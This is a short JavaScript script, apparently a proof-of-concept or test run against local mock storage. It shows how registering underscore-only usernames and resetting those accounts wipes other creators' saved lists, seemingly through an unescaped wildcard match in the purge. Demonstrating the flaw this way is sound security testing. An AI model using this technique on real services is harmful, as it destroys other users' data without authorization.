import { makeKv, makeRealD1, makeEnv, call, createUser } from "./kit.mjs";

const DB = makeRealD1();
const env = makeEnv({ CONFIGS: makeKv(), DB });

// A handful of ordinary creators of different name lengths.
const victims = ["alice", "bobby", "carl", "dee-jay", "eve1", "frankie-films"];
for (const name of victims) {
  const u = await createUser(env, name);
  await call(env, "/api/creator/lists/save", { method: "POST", json: {
    creatorName: name, creatorKey: u.creatorKey, name: "My List", type: "movie",
    visibility: "public", items: [{ id: "tt1" }],
  }});
}
console.log("D1 list rows before:", DB.q("SELECT id FROM creator_lists").map(r => r.id));

// One anonymous attacker. Register usernames made only of `_`, one per length,
// then reset each account (account/reset keeps the identity, so it can be
// repeated, and it runs the exact same purge).
let wiped = 0;
for (let len = 3; len <= 25; len++) {
  const name = "_".repeat(len);
  let u;
  try { u = await createUser(env, name); } catch (e) { console.log("could not register", name, e.message); continue; }
  const r = await call(env, "/api/creator/account/reset", { method: "POST", json: {
    creatorName: name, creatorKey: u.creatorKey, confirm: "RESET",
  }});
  if (r.body.ok) wiped++;
}
console.log(`attacker registered+reset ${wiped} underscore accounts`);
console.log("D1 list rows after:", DB.q("SELECT id FROM creator_lists").map(r => r.id));
console.log("D1 creators still there:", DB.q("SELECT COUNT(*) n FROM creators")[0].n);
console.log("victim KV records intact:", victims.every(v => !!env.CONFIGS._store.get(`creatorlist:${v}:my-list`)));
